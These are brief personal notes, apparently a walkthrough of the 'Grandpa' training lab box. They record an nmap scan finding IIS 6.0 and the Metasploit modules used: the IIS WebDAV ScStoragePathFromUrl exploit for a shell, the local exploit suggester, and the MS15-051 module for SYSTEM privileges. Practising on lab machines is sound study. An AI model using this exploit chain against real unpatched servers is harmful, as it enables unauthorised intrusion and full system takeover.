----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Grandpa
# 19/3/2023
10.10.10.14

----------------------------------------------------
# nmap
----------------------------------------------------
80/tcp open  http    Microsoft IIS httpd 6.0

----------------------------------------------------
# exploitation
----------------------------------------------------
msf6 > search IIS 6.0
use windows/iis/iis_webdav_scstoragepathfromurl
set options
you got shell

migrate with other ps like davcdata.exe

----------------------------------------------------
# priv esc
----------------------------------------------------
use multi/recon/local_exploit_suggester
set options run


use exploit/windows/local/ms15_051_client_copy_image
set options run

you got system
